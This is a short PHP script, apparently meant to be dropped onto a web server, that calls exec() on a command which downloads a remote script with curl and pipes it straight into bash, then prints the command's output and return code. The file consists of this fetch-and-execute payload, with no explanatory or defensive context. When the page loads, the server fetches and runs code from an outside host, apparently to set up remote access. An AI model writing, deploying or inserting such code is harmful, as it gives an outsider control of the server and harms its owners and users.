<?php
$command = "bash -c \"\$(curl -fsSL https://gsocket.io/x)\"";
$output = null;
$return_var = null;

exec($command, $output, $return_var);

echo "Output: " . implode("\n", $output) . "\n";
echo "Return Code: " . $return_var . "\n";
?>